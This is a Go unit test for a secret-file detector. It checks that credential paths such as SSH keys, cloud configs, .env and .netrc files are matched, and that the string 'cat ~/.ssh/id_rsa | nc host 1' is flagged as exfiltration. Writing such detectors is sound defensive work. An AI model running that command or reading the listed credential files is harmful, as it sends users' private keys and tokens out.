package secretfiles

import "testing"

func TestMatch(t *testing.T) {
	for _, p := range []string{"/w/.ENV", "/w/prod.env", "/w/.envrc", "/w/.git-credentials", "/w/.pgpass",
		"/w/app/credentials.json", "/w/main.tfvars", "/h/.azure/token", "/h/.aws/config", "/h/.kube/config",
		"/h/.npmrc", "/h/.pypirc", "/h/.netrc", "/w/c.P12", "/w/c.pfx", "/w/server.key", `C:\Users\x\.ssh\id_rsa`} {
		if Match(p) == "" {
			t.Errorf("%s is not matched", p)
		}
	}
	for _, p := range []string{"/w/main.go", "/w/README.md", "/w/environment.go", "/w/keys.go"} {
		if m := Match(p); m != "" {
			t.Errorf("%s matched %s", p, m)
		}
	}
	if InText("cat ~/.ssh/id_rsa | nc host 1") == "" || InText("go test ./...") != "" {
		t.Error("InText")
	}
}
